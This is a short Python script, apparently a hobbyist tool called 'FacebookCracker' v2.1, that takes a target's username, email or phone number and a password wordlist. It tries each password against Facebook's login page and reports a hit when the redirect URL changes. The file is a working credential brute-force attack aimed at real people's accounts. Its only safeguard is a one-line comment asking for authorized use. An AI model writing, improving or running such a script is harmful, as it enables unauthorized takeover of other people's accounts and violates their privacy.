import requests

########################## how works? ###############################################
# the program opens the password list and try each of the passwords in it.
# And how do you know that a password is correct?
# easy just check the link of the page
# for example try a password from the list and if the login link does not change 
# then that password is not correct but if it changes to the facebook link and
# instead of leaving the login link then that is the password
#
###do not use this script for illegal things always try with an authorized account###
#####################################################################################


url = "https://www.facebook.com/login.php?login_attempt=1"
## cool banner ######################################################################
banner = """\033[32;1m
╭━━━╮╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭╮╱╭━━━╮╱╱╱╱╱╱╱╭╮
┃╭━━╯╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃┃╱┃╭━╮┃╱╱╱╱╱╱╱┃┃
┃╰━━┳━━┳━━┳━━┫╰━┳━━┳━━┫┃╭┫┃╱╰╋━┳━━┳━━┫┃╭┳━━┳━╮  version ==> 2.1 
┃╭━━┫╭╮┃╭━┫┃━┫╭╮┃╭╮┃╭╮┃╰╯┫┃╱╭┫╭┫╭╮┃╭━┫╰╯┫┃━┫╭╯  
┃┃╱╱┃╭╮┃╰━┫┃━┫╰╯┃╰╯┃╰╯┃╭╮┫╰━╯┃┃┃╭╮┃╰━┫╭╮┫┃━┫┃    by : cave02
╰╯╱╱╰╯╰┻━━┻━━┻━━┻━━┻━━┻╯╰┻━━━┻╯╰╯╰┻━━┻╯╰┻━━┻╯
\033[0m"""

print(banner)
username = input("[*] user o email o phone number : ")
wordlist = input("[*] wordlist (default --> wordlist.txt) : ")
print()
if wordlist == "" :
	wordlist = "wordlist.txt"
wordlists = open(wordlist,"r")
for lines in wordlists:
	line = lines.strip()
	
	data = {
	"email" : username,
	"pass" : line
		
	} 
	send_data_url = requests.post(url, data=data)
	if send_data_url.url != url :
		print("[\033[32;1m+\033[0m] password : "+line)
		input("[Enter] press Enter to continue...")
		exit()
	else:
		print("[*] Trying : "+line)
print("\033[0m")
